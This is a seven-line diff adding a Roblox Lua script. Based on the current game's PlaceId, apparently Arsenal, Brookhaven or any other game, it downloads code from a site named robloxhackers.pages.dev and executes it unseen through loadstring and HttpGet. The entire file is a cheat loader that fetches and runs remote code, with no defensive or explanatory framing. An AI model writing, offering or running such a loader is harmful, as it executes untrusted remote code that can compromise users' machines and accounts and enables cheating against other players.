@@ -1,0 +1,7 @@
+if game.PlaceId == 286090429 then
+  loadstring(game:HttpGet("https://robloxhackers.pages.dev/ArsenalOpenSource"))()
+elseif game.PlaceId == 4924922222 then
+  loadstring(game:HttpGet("https://robloxhackers.pages.dev/BrookhavenOpenSource"))()
+else
+ loadstring(game:HttpGet("https://robloxhackers.pages.dev/universalhub"))()
+end
